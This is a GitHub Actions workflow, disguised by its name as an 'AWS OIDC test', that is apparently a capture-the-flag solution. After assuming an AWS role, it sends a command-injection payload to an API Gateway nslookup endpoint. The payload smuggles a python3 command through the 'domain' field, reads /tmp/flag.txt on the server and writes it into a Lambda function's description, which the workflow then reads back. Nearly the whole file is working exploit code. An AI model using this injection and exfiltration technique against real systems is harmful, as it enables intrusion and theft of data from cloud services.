name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Trigger URL-Decode Injection & Fetch Flag
        run: |
          python3 << 'PYEOF'
          import urllib.request
          import json
          import time
          import subprocess

          url = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
          
          # Clean Python-constructed command injection payload
          # Reads /tmp/flag.txt, URL-decodes it, and pushes it into Lambda Description via boto3
          lambda_cmd = (
              '127.0.0.1; python3 -c "'
              'import boto3, urllib.parse; '
              'f = open(\'/tmp/flag.txt\').read().strip(); '
              'decoded = urllib.parse.unquote(f); '
              'boto3.client(\'lambda\').update_function_configuration('
              'FunctionName=\'nslookupv2\', Description=decoded'
              ')"'
          )

          payload = json.dumps({"domain": lambda_cmd}).encode('utf-8')
          req = urllib.request.Request(
              url,
              data=payload,
              headers={'Content-Type': 'application/json'},
              method='POST'
          )

          print("=== 1. TRIGGERING INJECTION VIA PYTHON HTTP REQUEST ===")
          try:
              with urllib.request.urlopen(req) as response:
                  print("API Gateway Response:", response.read().decode('utf-8'))
          except Exception as e:
              print("Request sent (response error caught):", e)

          print("=== 2. WAITING 3 SECONDS FOR PROPAGATION ===")
          time.sleep(3)
          PYEOF

          echo ""
          echo "=== 3. FETCHING DECODED FLAG VIA CICDROLE ==="
          aws lambda get-function --function-name nslookupv2 --region us-east-1 --query 'Configuration.Description' --output text > ./the_flag.txt
          
          echo ""
          echo "=== 4. BEHOLD YOUR HARD-EARNED VICTORY ==="
          cat ./the_flag.txt
